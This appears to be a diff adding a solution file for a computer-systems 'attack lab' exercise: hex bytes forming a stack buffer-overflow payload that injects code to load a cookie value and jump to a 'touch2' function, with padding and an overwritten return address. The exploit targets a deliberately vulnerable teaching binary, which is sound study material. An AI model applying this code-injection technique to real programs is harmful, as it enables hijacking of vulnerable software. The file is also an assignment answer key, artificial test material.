@@ -1,0 +1,5 @@
+48 c7 c7 f9 62 f7 5f 68 8e 19		/* push cookie and address of touch2 and return */
+40 00 c3 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30 30 30
+28 41 61 55 00 00 00 00			/* set break pt right after Gets function, value of rsp */
